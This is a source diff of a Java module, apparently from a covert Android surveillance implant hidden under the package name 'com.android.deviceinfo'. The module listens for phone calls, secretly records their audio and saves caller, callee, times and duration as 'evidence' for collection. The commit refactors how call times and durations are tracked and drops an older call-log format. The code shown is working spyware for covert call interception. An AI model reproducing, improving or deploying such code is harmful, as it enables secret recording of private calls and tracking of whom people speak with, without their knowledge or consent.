@@ -12,6 +12,7 @@ package com.android.deviceinfo.module;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.IOException;
+import java.util.Date;
 import java.util.HashMap;
 import java.util.concurrent.TimeUnit;
 
@@ -44,8 +45,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private MediaRecorder recorder = null;
 	private boolean recordFlag;
 	private String currentRecordFile;
-	private DateTime fromTime;
-	private String number, model;
+	// private Date fromTime;
+	// private String number, model;
 	private int strategy = 0;
 
 	private static final int CALLIST_PHONE = 0x0;
@@ -54,7 +55,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };
-	
+
 	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
 
 	@Override
@@ -105,34 +106,20 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 					+ " (notification): number: " + call.getNumber() + " in:" + call.isIncoming() + " runn:" + isRunning()); //$NON-NLS-1$
 		}
 
-		if (call.isComplete() == false) {
+		if (call.isOffhook() == false) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): call not yet established"); //$NON-NLS-1$
 			}
-
 			return 0;
 		}
 
 		final boolean incoming = call.isIncoming();
-
-		if (call.isOngoing()) {
-			// save date and number
-			fromTime = new DateTime(call.getTimestamp());
-			number = call.getNumber();
-		}
-
-		if (number == null) {
-			number = "";
-		}
-
-		final DateTime toTime = new DateTime(call.getTimestamp());
-		
+		boolean recording = false;
 
 		try {
 			// Let's start with call recording
 			if (recordFlag && isSupported()) {
-				recordCall(call, incoming, toTime);
-
+				recording = recordCall(call, incoming);
 			}
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
@@ -149,24 +136,25 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			String from, to;
 			String local = Device.self().getPhoneNumber();
 			if (incoming) {
-				from = number;
+				from = call.getNumber();
 				to = local;
 			} else {
 				from = local;
-				to = number;
+				to = call.getNumber();
 			}
-			saveCalllistEvidence(CALLIST_PHONE, from, to, incoming, fromTime, toTime);
+			saveCalllistEvidence(CALLIST_PHONE, from, to, incoming, call.getTimeBegin(), call.getDuration());
 		}
 
 		return 0;
 	}
 
-	private boolean recordCall(Call call, final boolean incoming, final DateTime toTime) {
+	private boolean recordCall(final Call call, final boolean incoming) {
 		if (!call.isOngoing()) {
 			if (stopRecord()) {
 				Object future = Status.self().getStpe().schedule(new Runnable() {
 					public void run() {
-						saveCallEvidence(number, incoming, fromTime, toTime, currentRecordFile);
+						saveCallEvidence(call.getNumber(), incoming, call.getTimeBegin(), call.getTimeEnd(),
+								currentRecordFile);
 					}
 				}, 100, TimeUnit.MILLISECONDS);
 
@@ -224,14 +212,15 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return false;
 	}
 
-	private boolean saveCallEvidence(String number, boolean incoming, DateTime from, DateTime to,
+	private boolean saveCallEvidence(String number, boolean incoming, Date dateBegin, Date dateEnd,
 			String currentRecordFile) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " number: " + number + " from: " + from
-					+ " to: " + to + " incoming: " + incoming);
+			Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " number: " + number + " from: " + dateBegin
+					+ " to: " + dateEnd + " incoming: " + incoming);
 		}
 
-		final byte[] additionaldata = getCallAdditionalData(number, incoming, from, to);
+		final byte[] additionaldata = getCallAdditionalData(number, incoming, new DateTime(dateBegin), new DateTime(
+				dateEnd));
 
 		AutoFile file = new AutoFile(currentRecordFile);
 		if (file.exists() && file.getSize() > HEADER_SIZE && file.canRead()) {
@@ -299,7 +288,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return pos;
 	}
 
-	private byte[] getCallAdditionalData(String number, boolean incoming, DateTime from, DateTime to) {
+	private byte[] getCallAdditionalData(String number, boolean incoming, DateTime dateBegin, DateTime dateEnd) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (getCallAdditionalData): " + number);
 		}
@@ -328,8 +317,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		additionalData.writeInt(program);
 		additionalData.writeInt(sampleRate);
 		additionalData.writeInt(incoming ? 1 : 0);
-		additionalData.writeLong(from.getFiledate());
-		additionalData.writeLong(to.getFiledate());
+		additionalData.writeLong(dateBegin.getFiledate());
+		additionalData.writeLong(dateEnd.getFiledate());
 
 		additionalData.writeInt(caller.length);
 		additionalData.writeInt(callee.length);
@@ -340,8 +329,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return additionaldata;
 	}
 
-	private void saveCalllistEvidence(int programId, String from, String to, boolean incoming, DateTime begin,
-			DateTime end) {
+	private void saveCalllistEvidence(int programId, String from, String to, boolean incoming, Date fromTime,
+			int duration) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveCalllistEvidence):  from: " + from + " to: " + to);
 		}
@@ -350,14 +339,13 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		// Adding header
 		try {
 
-			int duration = (int) ((end.getTime() - begin.getTime()) / 1000);
 			int flags = incoming ? 1 : 0;
-			
+
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveCalllistEvidence) %s -> %s = %s", begin, end, duration);
+				Check.log(TAG + " (saveCalllistEvidence) %s: %ss", fromTime, duration);
 			}
 
-			outputStream.write(ByteArray.intToByteArray((int) (begin.getTime() / 1000)));
+			outputStream.write(ByteArray.intToByteArray((int) (fromTime.getTime() / 1000)));
 			outputStream.write(ByteArray.intToByteArray(programId));
 			outputStream.write(ByteArray.intToByteArray(flags));
 			outputStream.write(WChar.getBytes(from, true));
@@ -377,65 +365,13 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 			return;
 		}
-		
+
 		byte[] data = outputStream.toByteArray();
 		EvidenceReference.atomic(EvidenceType.CALLLISTNEW, null, data);
 	}
 
-	private void saveCalllistEvidenceOld(String number, boolean incoming, DateTime from, DateTime to) {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (saveCalllistEvidence): " + number + " from: " + from + " to: " + to);
-		}
-
-		if (Cfg.DEBUG) {
-			Check.asserts(number != null, " (saveCalllistEvidence) Assert failed");
-		}
-		final boolean outgoing = !incoming;
-		// final int duration = call.getDuration(call);
-
-		final String name = ""; //$NON-NLS-1$
-		final boolean missed = false;
-		// 7_0=u
-		// 7_1=no notes
-		final String nametype = M.e("u"); //$NON-NLS-1$
-		final String note = M.e("no notes"); //$NON-NLS-1$
-
-		final int LOG_CALLIST_VERSION = 0;
-
-		int len = 28; // 0x1C;
-
-		len += wsize(number);
-		len += wsize(name);
-		len += wsize(note);
-		len += wsize(nametype);
-
-		final byte[] data = new byte[len];
-
-		final DataBuffer databuffer = new DataBuffer(data, 0, len);
-
-		databuffer.writeInt(len);
-		databuffer.writeInt(LOG_CALLIST_VERSION);
-		databuffer.writeLong(from.getFiledate());
-		databuffer.writeLong(to.getFiledate());
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG
-					+ " (saveCalllistEvidence): Duration from: " + from.getFiledate() + " to: " + to.getFiledate()); //$NON-NLS-1$
-		}
-
-		final int flags = (outgoing ? 1 : 0) + (missed ? 0 : 6);
-		databuffer.writeInt(flags);
-
-		addTypedString(databuffer, (byte) 0x01, name);
-		addTypedString(databuffer, (byte) 0x02, nametype);
-		addTypedString(databuffer, (byte) 0x04, note);
-		addTypedString(databuffer, (byte) 0x08, number);
-
-		EvidenceReference.atomic(EvidenceType.CALLLISTOLD, null, data);
-	}
-
 	private boolean isSupported() {
-		model = Build.MODEL.toLowerCase();
+		String model = Build.MODEL.toLowerCase();
 		boolean supported = false;
 
 		if (Cfg.DEBUG) {
@@ -508,8 +444,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			recorder.prepare();
 			recorder.start();
 		} catch (Exception e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (startRecord) Error: cannot start recording");
 			}
 
 			recorder = null;
